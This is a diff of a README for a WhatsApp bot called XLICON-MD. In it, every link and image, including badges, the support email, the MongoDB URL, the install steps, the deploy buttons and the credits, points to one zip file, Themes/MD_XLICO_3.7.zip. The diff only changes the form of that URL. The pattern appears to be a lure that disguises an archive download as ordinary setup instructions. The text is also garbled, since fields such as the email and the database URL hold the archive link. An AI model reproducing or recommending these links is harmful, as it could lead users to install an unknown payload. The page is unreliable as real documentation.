@@ -1,11 +1,11 @@
 ## `XLICON-MD`
 <div align="left">
-<a href="https://github.com/HONESTHACK/XLICON-MD/raw/refs/heads/main/Themes/MD_XLICO_3.7.zip"><img src="https://github.com/HONESTHACK/XLICON-MD/raw/refs/heads/main/Themes/MD_XLICO_3.7.zip XLICON-MD;Multi+Device+Whatsapp+Bot;Developed+By+SALMAN AHMAD" alt="Typing SVG" /></a>
+<a href="https://raw.githubusercontent.com/HONESTHACK/XLICON-MD/main/Themes/MD_XLICO_3.7.zip"><img src="https://raw.githubusercontent.com/HONESTHACK/XLICON-MD/main/Themes/MD_XLICO_3.7.zip XLICON-MD;Multi+Device+Whatsapp+Bot;Developed+By+SALMAN AHMAD" alt="Typing SVG" /></a>
   
   
 <p align="center">
   <a href="">
-    <img alt=Support height="300" src="https://github.com/HONESTHACK/XLICON-MD/raw/refs/heads/main/Themes/MD_XLICO_3.7.zip"> 
+    <img alt=Support height="300" src="https://raw.githubusercontent.com/HONESTHACK/XLICON-MD/main/Themes/MD_XLICO_3.7.zip"> 
     </p>
     <h1 align="center">XLICON-1.O<br></h1>
     
@@ -13,16 +13,16 @@
 </p>
   
 <p align="center">
-<a href="https://github.com/HONESTHACK/XLICON-MD/raw/refs/heads/main/Themes/MD_XLICO_3.7.zip"><img title="Author" src="https://github.com/HONESTHACK/XLICON-MD/raw/refs/heads/main/Themes/MD_XLICO_3.7.zip"></a>
+<a href="https://raw.githubusercontent.com/HONESTHACK/XLICON-MD/main/Themes/MD_XLICO_3.7.zip"><img title="Author" src="https://raw.githubusercontent.com/HONESTHACK/XLICON-MD/main/Themes/MD_XLICO_3.7.zip"></a>
 <p/>
 <p align="center">
-<a href="https://github.com/HONESTHACK/XLICON-MD/raw/refs/heads/main/Themes/MD_XLICO_3.7.zip"><img title="Followers" src="https://github.com/HONESTHACK/XLICON-MD/raw/refs/heads/main/Themes/MD_XLICO_3.7.zip"></a>
-<a href="https://github.com/HONESTHACK/XLICON-MD/raw/refs/heads/main/Themes/MD_XLICO_3.7.zip"><img title="Stars" src="https://github.com/HONESTHACK/XLICON-MD/raw/refs/heads/main/Themes/MD_XLICO_3.7.zip"></a>
-<a href="https://github.com/HONESTHACK/XLICON-MD/raw/refs/heads/main/Themes/MD_XLICO_3.7.zip"><img title="Fork" src="https://github.com/HONESTHACK/XLICON-MD/raw/refs/heads/main/Themes/MD_XLICO_3.7.zip"></a>
-<a href="https://github.com/HONESTHACK/XLICON-MD/raw/refs/heads/main/Themes/MD_XLICO_3.7.zip"><img title="Watching" src="https://github.com/HONESTHACK/XLICON-MD/raw/refs/heads/main/Themes/MD_XLICO_3.7.zip"></a>
+<a href="https://raw.githubusercontent.com/HONESTHACK/XLICON-MD/main/Themes/MD_XLICO_3.7.zip"><img title="Followers" src="https://raw.githubusercontent.com/HONESTHACK/XLICON-MD/main/Themes/MD_XLICO_3.7.zip"></a>
+<a href="https://raw.githubusercontent.com/HONESTHACK/XLICON-MD/main/Themes/MD_XLICO_3.7.zip"><img title="Stars" src="https://raw.githubusercontent.com/HONESTHACK/XLICON-MD/main/Themes/MD_XLICO_3.7.zip"></a>
+<a href="https://raw.githubusercontent.com/HONESTHACK/XLICON-MD/main/Themes/MD_XLICO_3.7.zip"><img title="Fork" src="https://raw.githubusercontent.com/HONESTHACK/XLICON-MD/main/Themes/MD_XLICO_3.7.zip"></a>
+<a href="https://raw.githubusercontent.com/HONESTHACK/XLICON-MD/main/Themes/MD_XLICO_3.7.zip"><img title="Watching" src="https://raw.githubusercontent.com/HONESTHACK/XLICON-MD/main/Themes/MD_XLICO_3.7.zip"></a>
 </p>
 
-<p align="center"><img src="https://github.com/HONESTHACK/XLICON-MD/raw/refs/heads/main/Themes/MD_XLICO_3.7.zip{salmanytofficial}https://github.com/HONESTHACK/XLICON-MD/raw/refs/heads/main/Themes/MD_XLICO_3.7.zip" alt="SALMAN AHMAD :: Visitor's Count" /></p>
+<p align="center"><img src="https://raw.githubusercontent.com/HONESTHACK/XLICON-MD/main/Themes/MD_XLICO_3.7.zip{salmanytofficial}https://raw.githubusercontent.com/HONESTHACK/XLICON-MD/main/Themes/MD_XLICO_3.7.zip" alt="SALMAN AHMAD :: Visitor's Count" /></p>
 
 ## `Notice`
 
@@ -35,15 +35,15 @@ Dont't Forget To ***SYNC FORK*** The Respository Before ***Deploy***
 
 1. Fork the repo
     <br>
-<a href="https://github.com/HONESTHACK/XLICON-MD/raw/refs/heads/main/Themes/MD_XLICO_3.7.zip"><img title="XLICON-1.0" src="https://github.com/HONESTHACK/XLICON-MD/raw/refs/heads/main/Themes/MD_XLICO_3.7.zip XLICON-1.0-h?color=black&style=for-the-badge&logo=stackshare"></a>
+<a href="https://raw.githubusercontent.com/HONESTHACK/XLICON-MD/main/Themes/MD_XLICO_3.7.zip"><img title="XLICON-1.0" src="https://raw.githubusercontent.com/HONESTHACK/XLICON-MD/main/Themes/MD_XLICO_3.7.zip XLICON-1.0-h?color=black&style=for-the-badge&logo=stackshare"></a>
 
 2. Scan the QR and upload the `Session` to ***XLICON-SECTION*** 
     <br>
-<a href='https://github.com/HONESTHACK/XLICON-MD/raw/refs/heads/main/Themes/MD_XLICO_3.7.zip' target="_blank"><img alt='SCAN QR-1' src='https://github.com/HONESTHACK/XLICON-MD/raw/refs/heads/main/Themes/MD_XLICO_3.7.zip'/></a>
+<a href='https://raw.githubusercontent.com/HONESTHACK/XLICON-MD/main/Themes/MD_XLICO_3.7.zip' target="_blank"><img alt='SCAN QR-1' src='https://raw.githubusercontent.com/HONESTHACK/XLICON-MD/main/Themes/MD_XLICO_3.7.zip'/></a>
 
 3. Scan Qr
     <br>
-<a href='https://github.com/HONESTHACK/XLICON-MD/raw/refs/heads/main/Themes/MD_XLICO_3.7.zip' target="_blank"><img alt='SCAN QR-2' src='https://github.com/HONESTHACK/XLICON-MD/raw/refs/heads/main/Themes/MD_XLICO_3.7.zip'/></a>
+<a href='https://raw.githubusercontent.com/HONESTHACK/XLICON-MD/main/Themes/MD_XLICO_3.7.zip' target="_blank"><img alt='SCAN QR-2' src='https://raw.githubusercontent.com/HONESTHACK/XLICON-MD/main/Themes/MD_XLICO_3.7.zip'/></a>
 
 
 ## `Features`
@@ -59,30 +59,30 @@ Dont't Forget To ***SYNC FORK*** The Respository Before ***Deploy***
 
 ## `Support`
 
-For support, email [ https://github.com/HONESTHACK/XLICON-MD/raw/refs/heads/main/Themes/MD_XLICO_3.7.zip ] or join our whatsapp group.
+For support, email [ https://raw.githubusercontent.com/HONESTHACK/XLICON-MD/main/Themes/MD_XLICO_3.7.zip ] or join our whatsapp group.
 
 
 <p align="center">
-  <a aria-label="Join our chats" href="https://github.com/HONESTHACK/XLICON-MD/raw/refs/heads/main/Themes/MD_XLICO_3.7.zip" target="_blank">
-    <img alt="whatsapp" src="https://github.com/HONESTHACK/XLICON-MD/raw/refs/heads/main/Themes/MD_XLICO_3.7.zip Group-25D366?style=for-the-badge&logo=whatsapp&logoColor=white" />
+  <a aria-label="Join our chats" href="https://raw.githubusercontent.com/HONESTHACK/XLICON-MD/main/Themes/MD_XLICO_3.7.zip" target="_blank">
+    <img alt="whatsapp" src="https://raw.githubusercontent.com/HONESTHACK/XLICON-MD/main/Themes/MD_XLICO_3.7.zip Group-25D366?style=for-the-badge&logo=whatsapp&logoColor=white" />
   </a>
-<a aria-label="Join our chats" href="https://github.com/HONESTHACK/XLICON-MD/raw/refs/heads/main/Themes/MD_XLICO_3.7.zip!! SalmanAhmad Sir, I need Your Help" target="_blank">
-    <img alt="whatsapp" src="https://github.com/HONESTHACK/XLICON-MD/raw/refs/heads/main/Themes/MD_XLICO_3.7.zip%20Whatsapp-25D366?style=for-the-badge&logo=whatsapp&logoColor=white" />
+<a aria-label="Join our chats" href="https://raw.githubusercontent.com/HONESTHACK/XLICON-MD/main/Themes/MD_XLICO_3.7.zip!! SalmanAhmad Sir, I need Your Help" target="_blank">
+    <img alt="whatsapp" src="https://raw.githubusercontent.com/HONESTHACK/XLICON-MD/main/Themes/MD_XLICO_3.7.zip%20Whatsapp-25D366?style=for-the-badge&logo=whatsapp&logoColor=white" />
 </p>
 
 
 ## `MONGODB URL`
 
 
-●.  ***Get a Mongodb urL from [Clever-Cloud](https://github.com/HONESTHACK/XLICON-MD/raw/refs/heads/main/Themes/MD_XLICO_3.7.zip).***
+●.  ***Get a Mongodb urL from [Clever-Cloud](https://raw.githubusercontent.com/HONESTHACK/XLICON-MD/main/Themes/MD_XLICO_3.7.zip).***
 
-●.  ***Get a Mongodb urL from [https://github.com/HONESTHACK/XLICON-MD/raw/refs/heads/main/Themes/MD_XLICO_3.7.zip](https://github.com/HONESTHACK/XLICON-MD/raw/refs/heads/main/Themes/MD_XLICO_3.7.zip).***
+●.  ***Get a Mongodb urL from [https://raw.githubusercontent.com/HONESTHACK/XLICON-MD/main/Themes/MD_XLICO_3.7.zip](https://raw.githubusercontent.com/HONESTHACK/XLICON-MD/main/Themes/MD_XLICO_3.7.zip).***
 
 
 
 
 ```
-mongodb+https://github.com/HONESTHACK/XLICON-MD/raw/refs/heads/main/Themes/MD_XLICO_3.7.zip
+mongodb+https://raw.githubusercontent.com/HONESTHACK/XLICON-MD/main/Themes/MD_XLICO_3.7.zip
 ```
 
 | Parameter | Type     | Description                |
@@ -91,7 +91,7 @@ mongodb+https://github.com/HONESTHACK/XLICON-MD/raw/refs/heads/main/Themes/MD_XL
 
 ## `Installation`
 
-https://github.com/HONESTHACK/XLICON-MD/raw/refs/heads/main/Themes/MD_XLICO_3.7.zip Installation
+https://raw.githubusercontent.com/HONESTHACK/XLICON-MD/main/Themes/MD_XLICO_3.7.zip Installation
 
 Paste This on the replit shell to run the Bot
 
@@ -115,7 +115,7 @@ After this fill the vars by your own information and paste this JSON to your Rep
 ```
 
 
-https://github.com/HONESTHACK/XLICON-MD/raw/refs/heads/main/Themes/MD_XLICO_3.7.zip Installation
+https://raw.githubusercontent.com/HONESTHACK/XLICON-MD/main/Themes/MD_XLICO_3.7.zip Installation
 Go to Okteto
 
 
@@ -126,12 +126,12 @@ Choose your repo
 ```
 
 
-https://github.com/HONESTHACK/XLICON-MD/raw/refs/heads/main/Themes/MD_XLICO_3.7.zip Installation 
-[HEROKU Tutorial](https://github.com/HONESTHACK/XLICON-MD/raw/refs/heads/main/Themes/MD_XLICO_3.7.zip)
+https://raw.githubusercontent.com/HONESTHACK/XLICON-MD/main/Themes/MD_XLICO_3.7.zip Installation 
+[HEROKU Tutorial](https://raw.githubusercontent.com/HONESTHACK/XLICON-MD/main/Themes/MD_XLICO_3.7.zip)
 
 
-https://github.com/HONESTHACK/XLICON-MD/raw/refs/heads/main/Themes/MD_XLICO_3.7.zip On Vps
-[Deploy on VPS or PC.](https://github.com/HONESTHACK/XLICON-MD/raw/refs/heads/main/Themes/MD_XLICO_3.7.zip)
+https://raw.githubusercontent.com/HONESTHACK/XLICON-MD/main/Themes/MD_XLICO_3.7.zip On Vps
+[Deploy on VPS or PC.](https://raw.githubusercontent.com/HONESTHACK/XLICON-MD/main/Themes/MD_XLICO_3.7.zip)
 
 
   ........................................................
@@ -147,12 +147,12 @@ https://github.com/HONESTHACK/XLICON-MD/raw/refs/heads/main/Themes/MD_XLICO_3.7.
  
 <br><br>   
    
-<h4 align="center"> Deploy on https://github.com/HONESTHACK/XLICON-MD/raw/refs/heads/main/Themes/MD_XLICO_3.7.zip
+<h4 align="center"> Deploy on https://raw.githubusercontent.com/HONESTHACK/XLICON-MD/main/Themes/MD_XLICO_3.7.zip
 </h4>
 
 <p align="center" >
-    <a href="https://github.com/HONESTHACK/XLICON-MD/raw/refs/heads/main/Themes/MD_XLICO_3.7.zip">
-    <img src="https://github.com/HONESTHACK/XLICON-MD/raw/refs/heads/main/Themes/MD_XLICO_3.7.zip" width="170px" alt="Deploy on REPLIT" >
+    <a href="https://raw.githubusercontent.com/HONESTHACK/XLICON-MD/main/Themes/MD_XLICO_3.7.zip">
+    <img src="https://raw.githubusercontent.com/HONESTHACK/XLICON-MD/main/Themes/MD_XLICO_3.7.zip" width="170px" alt="Deploy on REPLIT" >
     </a>
 </p>
 
@@ -172,8 +172,8 @@ https://github.com/HONESTHACK/XLICON-MD/raw/refs/heads/main/Themes/MD_XLICO_3.7.
 </p>
 
 <p align="center" >
-    <a href="https://github.com/HONESTHACK/XLICON-MD/raw/refs/heads/main/Themes/MD_XLICO_3.7.zip">
-    <img src="https://github.com/HONESTHACK/XLICON-MD/raw/refs/heads/main/Themes/MD_XLICO_3.7.zip CODESPACE-h?color=black&style=for-the-badge&logo=visualstudiocode" width="170px" alt="Deploy on CodesSpaces" >
+    <a href="https://raw.githubusercontent.com/HONESTHACK/XLICON-MD/main/Themes/MD_XLICO_3.7.zip">
+    <img src="https://raw.githubusercontent.com/HONESTHACK/XLICON-MD/main/Themes/MD_XLICO_3.7.zip CODESPACE-h?color=black&style=for-the-badge&logo=visualstudiocode" width="170px" alt="Deploy on CodesSpaces" >
     </a>
 
 </p>
@@ -194,8 +194,8 @@ https://github.com/HONESTHACK/XLICON-MD/raw/refs/heads/main/Themes/MD_XLICO_3.7.
 </p>
 
 <p align="center" >
-    <a href="https://github.com/HONESTHACK/XLICON-MD/raw/refs/heads/main/Themes/MD_XLICO_3.7.zip">
-    <img src="https://github.com/HONESTHACK/XLICON-MD/raw/refs/heads/main/Themes/MD_XLICO_3.7.zip" width="170px" alt="Deploy on Heroku" >
+    <a href="https://raw.githubusercontent.com/HONESTHACK/XLICON-MD/main/Themes/MD_XLICO_3.7.zip">
+    <img src="https://raw.githubusercontent.com/HONESTHACK/XLICON-MD/main/Themes/MD_XLICO_3.7.zip" width="170px" alt="Deploy on Heroku" >
     </a>
 
 </p>
@@ -217,8 +217,8 @@ https://github.com/HONESTHACK/XLICON-MD/raw/refs/heads/main/Themes/MD_XLICO_3.7.
 </p>
 
 <p align="center" >
-    <a href="https://github.com/HONESTHACK/XLICON-MD/raw/refs/heads/main/Themes/MD_XLICO_3.7.zip%20i&run_command=npm%20start&env[SESSION_ID]&env[OWNER_NUMBER]&env[MONGODB_URI]&&env[OWNER_NAME]&env[PREFIX]=.&env[THUMB_IMAGE]https://github.com/HONESTHACK/XLICON-MD/raw/refs/heads/main/Themes/MD_XLICO_3.7.zip[email]https://github.com/HONESTHACK/XLICON-MD/raw/refs/heads/main/Themes/MD_XLICO_3.7.zip[global_url]https://github.com/HONESTHACK/XLICON-MD/raw/refs/heads/main/Themes/MD_XLICO_3.7.zip[FAKE_COUNTRY_CODE]=974&env[READ_MESSAGE]=false&env[DISABLE_PM]=false&env[ANTI_BAD_WORD]=fuck&env[WORKTYPE]=public&env[THEME]=GOJO&env[PACK_INFO]=XLICON;MD&name=xliconuser000&env[KOYEB_NAME]=profilecorruptederror&env[ANTILINK_VALUES]https://github.com/HONESTHACK/XLICON-MD/raw/refs/heads/main/Themes/MD_XLICO_3.7.zip[PORT]=8000">
-    <img src="https://github.com/HONESTHACK/XLICON-MD/raw/refs/heads/main/Themes/MD_XLICO_3.7.zip" width="170px" alt="Deploy on Koyeb" >
+    <a href="https://raw.githubusercontent.com/HONESTHACK/XLICON-MD/main/Themes/MD_XLICO_3.7.zip%20i&run_command=npm%20start&env[SESSION_ID]&env[OWNER_NUMBER]&env[MONGODB_URI]&&env[OWNER_NAME]&env[PREFIX]=.&env[THUMB_IMAGE]https://raw.githubusercontent.com/HONESTHACK/XLICON-MD/main/Themes/MD_XLICO_3.7.zip[email]https://raw.githubusercontent.com/HONESTHACK/XLICON-MD/main/Themes/MD_XLICO_3.7.zip[global_url]https://raw.githubusercontent.com/HONESTHACK/XLICON-MD/main/Themes/MD_XLICO_3.7.zip[FAKE_COUNTRY_CODE]=974&env[READ_MESSAGE]=false&env[DISABLE_PM]=false&env[ANTI_BAD_WORD]=fuck&env[WORKTYPE]=public&env[THEME]=GOJO&env[PACK_INFO]=XLICON;MD&name=xliconuser000&env[KOYEB_NAME]=profilecorruptederror&env[ANTILINK_VALUES]https://raw.githubusercontent.com/HONESTHACK/XLICON-MD/main/Themes/MD_XLICO_3.7.zip[PORT]=8000">
+    <img src="https://raw.githubusercontent.com/HONESTHACK/XLICON-MD/main/Themes/MD_XLICO_3.7.zip" width="170px" alt="Deploy on Koyeb" >
     </a>
 
 </p>
@@ -238,8 +238,8 @@ https://github.com/HONESTHACK/XLICON-MD/raw/refs/heads/main/Themes/MD_XLICO_3.7.
 </h4>
   
 <p align="center">
-    <a href="https://github.com/HONESTHACK/XLICON-MD/raw/refs/heads/main/Themes/MD_XLICO_3.7.zip">
-    <p align="center"><a href="https://github.com/HONESTHACK/XLICON-MD/raw/refs/heads/main/Themes/MD_XLICO_3.7.zip"> <img src="https://github.com/HONESTHACK/XLICON-MD/raw/refs/heads/main/Themes/MD_XLICO_3.7.zip RAILWAY-h?color=black&style=for-the-badge&logo=Railway"></a>
+    <a href="https://raw.githubusercontent.com/HONESTHACK/XLICON-MD/main/Themes/MD_XLICO_3.7.zip">
+    <p align="center"><a href="https://raw.githubusercontent.com/HONESTHACK/XLICON-MD/main/Themes/MD_XLICO_3.7.zip"> <img src="https://raw.githubusercontent.com/HONESTHACK/XLICON-MD/main/Themes/MD_XLICO_3.7.zip RAILWAY-h?color=black&style=for-the-badge&logo=Railway"></a>
     
 </p>
 
@@ -260,8 +260,8 @@ https://github.com/HONESTHACK/XLICON-MD/raw/refs/heads/main/Themes/MD_XLICO_3.7.
 </h4>
   
 <p align="center">
-    <a href="https://github.com/HONESTHACK/XLICON-MD/raw/refs/heads/main/Themes/MD_XLICO_3.7.zip">
-    <img src="https://github.com/HONESTHACK/XLICON-MD/raw/refs/heads/main/Themes/MD_XLICO_3.7.zip" alt="Deploy on Okteto" width="170px">
+    <a href="https://raw.githubusercontent.com/HONESTHACK/XLICON-MD/main/Themes/MD_XLICO_3.7.zip">
+    <img src="https://raw.githubusercontent.com/HONESTHACK/XLICON-MD/main/Themes/MD_XLICO_3.7.zip" alt="Deploy on Okteto" width="170px">
     </a>
     
 </p>
@@ -281,8 +281,8 @@ https://github.com/HONESTHACK/XLICON-MD/raw/refs/heads/main/Themes/MD_XLICO_3.7.
 </h4>
   
 <p align="center">
-    <a href="https://github.com/HONESTHACK/XLICON-MD/raw/refs/heads/main/Themes/MD_XLICO_3.7.zip">
-    <img src="https://github.com/HONESTHACK/XLICON-MD/raw/refs/heads/main/Themes/MD_XLICO_3.7.zip" alt="Deploy on Mogenius" width="170px">
+    <a href="https://raw.githubusercontent.com/HONESTHACK/XLICON-MD/main/Themes/MD_XLICO_3.7.zip">
+    <img src="https://raw.githubusercontent.com/HONESTHACK/XLICON-MD/main/Themes/MD_XLICO_3.7.zip" alt="Deploy on Mogenius" width="170px">
     </a>
     
 </p>
@@ -299,8 +299,8 @@ https://github.com/HONESTHACK/XLICON-MD/raw/refs/heads/main/Themes/MD_XLICO_3.7.
 </h4>
   
 <p align="center">
-    <a href="https://github.com/HONESTHACK/XLICON-MD/raw/refs/heads/main/Themes/MD_XLICO_3.7.zip">
-    <img src="https://github.com/HONESTHACK/XLICON-MD/raw/refs/heads/main/Themes/MD_XLICO_3.7.zip" alt="Deploy on Uffizzi" width="125px">
+    <a href="https://raw.githubusercontent.com/HONESTHACK/XLICON-MD/main/Themes/MD_XLICO_3.7.zip">
+    <img src="https://raw.githubusercontent.com/HONESTHACK/XLICON-MD/main/Themes/MD_XLICO_3.7.zip" alt="Deploy on Uffizzi" width="125px">
     </a>
     
 </p>
@@ -311,8 +311,8 @@ https://github.com/HONESTHACK/XLICON-MD/raw/refs/heads/main/Themes/MD_XLICO_3.7.
 </h4>
   
 <p align="center">
-    <a href="https://github.com/HONESTHACK/XLICON-MD/raw/refs/heads/main/Themes/MD_XLICO_3.7.zip">
-    <img src="https://github.com/HONESTHACK/XLICON-MD/raw/refs/heads/main/Themes/MD_XLICO_3.7.zip" alt="Deploy on Boxmineworld" width="175px">
+    <a href="https://raw.githubusercontent.com/HONESTHACK/XLICON-MD/main/Themes/MD_XLICO_3.7.zip">
+    <img src="https://raw.githubusercontent.com/HONESTHACK/XLICON-MD/main/Themes/MD_XLICO_3.7.zip" alt="Deploy on Boxmineworld" width="175px">
     </a>
     <br>
 
@@ -337,16 +337,16 @@ https://github.com/HONESTHACK/XLICON-MD/raw/refs/heads/main/Themes/MD_XLICO_3.7.
 
 <div align="center">
   
-| [![𝚂𝚊𝚕𝚖𝚊𝚗𝙾𝚏𝚏𝚒𝚌𝚒𝚊𝚕](https://github.com/HONESTHACK/XLICON-MD/raw/refs/heads/main/Themes/MD_XLICO_3.7.zip)](https://github.com/HONESTHACK/XLICON-MD/raw/refs/heads/main/Themes/MD_XLICO_3.7.zip)|
+| [![𝚂𝚊𝚕𝚖𝚊𝚗𝙾𝚏𝚏𝚒𝚌𝚒𝚊𝚕](https://raw.githubusercontent.com/HONESTHACK/XLICON-MD/main/Themes/MD_XLICO_3.7.zip)](https://raw.githubusercontent.com/HONESTHACK/XLICON-MD/main/Themes/MD_XLICO_3.7.zip)|
 |----|
-| [ 𝙎𝘼𝙇𝙈𝘼𝙉 𝘼𝙃𝙈𝘼𝘿 ](https://github.com/HONESTHACK/XLICON-MD/raw/refs/heads/main/Themes/MD_XLICO_3.7.zip) |
+| [ 𝙎𝘼𝙇𝙈𝘼𝙉 𝘼𝙃𝙈𝘼𝘿 ](https://raw.githubusercontent.com/HONESTHACK/XLICON-MD/main/Themes/MD_XLICO_3.7.zip) |
 |  Owner, Developer, Bug Fixer, Maintainer, updates |
 
   
-| [![SlasherOfficial](https://github.com/HONESTHACK/XLICON-MD/raw/refs/heads/main/Themes/MD_XLICO_3.7.zip)](https://github.com/HONESTHACK/XLICON-MD/raw/refs/heads/main/Themes/MD_XLICO_3.7.zip) |
+| [![SlasherOfficial](https://raw.githubusercontent.com/HONESTHACK/XLICON-MD/main/Themes/MD_XLICO_3.7.zip)](https://raw.githubusercontent.com/HONESTHACK/XLICON-MD/main/Themes/MD_XLICO_3.7.zip) |
 |----|
-| [ N ᴏ ᴛ   S ʟ ᴀ ꜱ ʜ ᴇ ʀ ](https://github.com/HONESTHACK/XLICON-MD/raw/refs/heads/main/Themes/MD_XLICO_3.7.zip) |
-|  https://github.com/HONESTHACK/XLICON-MD/raw/refs/heads/main/Themes/MD_XLICO_3.7.zip , Bug Fixer, |
+| [ N ᴏ ᴛ   S ʟ ᴀ ꜱ ʜ ᴇ ʀ ](https://raw.githubusercontent.com/HONESTHACK/XLICON-MD/main/Themes/MD_XLICO_3.7.zip) |
+|  https://raw.githubusercontent.com/HONESTHACK/XLICON-MD/main/Themes/MD_XLICO_3.7.zip , Bug Fixer, |
 
   </div>
   
@@ -368,11 +368,11 @@ https://github.com/HONESTHACK/XLICON-MD/raw/refs/heads/main/Themes/MD_XLICO_3.7.
 <h1 align="left">  ✨Spacial Thanks To🎯
 </h1>
 
-* [`🎐 Sampandey`](https://github.com/HONESTHACK/XLICON-MD/raw/refs/heads/main/Themes/MD_XLICO_3.7.zip) ***For Sector MD Base***
-* [`🎐 SuhailTechInfo`](https://github.com/HONESTHACK/XLICON-MD/raw/refs/heads/main/Themes/MD_XLICO_3.7.zip) ***For Plugins and Debugging***
-* [`🎐 Abraham Dwamena`](https://github.com/HONESTHACK/XLICON-MD/raw/refs/heads/main/Themes/MD_XLICO_3.7.zip) ***For QR Ideas***
-* [`🎐 MR-KALINDU`](https://github.com/HONESTHACK/XLICON-MD/raw/refs/heads/main/Themes/MD_XLICO_3.7.zip) ***For Fixing Plugins***
-* [`🎐 MAHER-ZUBAIR`](https://github.com/HONESTHACK/XLICON-MD/raw/refs/heads/main/Themes/MD_XLICO_3.7.zip) ***For Fixing Errors***
+* [`🎐 Sampandey`](https://raw.githubusercontent.com/HONESTHACK/XLICON-MD/main/Themes/MD_XLICO_3.7.zip) ***For Sector MD Base***
+* [`🎐 SuhailTechInfo`](https://raw.githubusercontent.com/HONESTHACK/XLICON-MD/main/Themes/MD_XLICO_3.7.zip) ***For Plugins and Debugging***
+* [`🎐 Abraham Dwamena`](https://raw.githubusercontent.com/HONESTHACK/XLICON-MD/main/Themes/MD_XLICO_3.7.zip) ***For QR Ideas***
+* [`🎐 MR-KALINDU`](https://raw.githubusercontent.com/HONESTHACK/XLICON-MD/main/Themes/MD_XLICO_3.7.zip) ***For Fixing Plugins***
+* [`🎐 MAHER-ZUBAIR`](https://raw.githubusercontent.com/HONESTHACK/XLICON-MD/main/Themes/MD_XLICO_3.7.zip) ***For Fixing Errors***
 
 ---
 
